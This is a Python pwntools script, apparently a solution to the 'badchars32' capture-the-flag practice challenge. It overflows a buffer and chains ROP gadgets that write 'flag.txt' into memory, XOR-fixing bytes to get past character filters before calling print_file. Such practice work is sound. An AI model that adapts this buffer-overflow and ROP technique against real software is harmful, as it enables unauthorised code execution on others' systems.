#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./badchars_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# pwn cyclic --context amd64 60 -a $(python3 -c 'import string; print(string.ascii_uppercase)')
padding = b'A' * 44

# ROPgadget --binary write432
# 0x0804854f : mov dword ptr [edi], esi ; ret
# 0x080485bb : pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048547 : xor byte ptr [ebp], bl ; ret
MOV_MEM = p32(0x804854f)
POP_EBP = p32(0x80485bb)
POP_EBX = p32(0x804839d)
POP_ESI_EDI_EBP = p32(0x80485b9)
XOR = p32(0x8048547)

# (r2) iS - to print sections adresses
# 0x00001018    0x8 0x0804a018    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x804a018

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# (r2) aaa; afl
# 0x080483d0    1      6 sym.imp.print_file
PR_FILE = p32(0x80483d0)

payload = padding
# load "flag" to memory
payload += POP_ESI_EDI_EBP + FLAG_STR + p32(DATA_ADDR) + p32(DATA_ADDR+2) + MOV_MEM
# fix "a"
payload += POP_EBX + p32(0x8a) + XOR
# fix "g"
payload += POP_EBP + p32(DATA_ADDR+3) + POP_EBX + p32(0x8c) + XOR
# load ".txt" to memory
payload += POP_ESI_EDI_EBP + TXT_STR + p32(DATA_ADDR+4) + p32(DATA_ADDR+4) + MOV_MEM
# fix "."
payload += POP_EBX + p32(0xc5) + XOR
# fix "x"
payload += POP_EBP + p32(DATA_ADDR+6) + POP_EBX + p32(0x93) + XOR
# print "flag.txt" content
payload += PR_FILE + p32(0xa5a5a5a5) + p32(DATA_ADDR)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
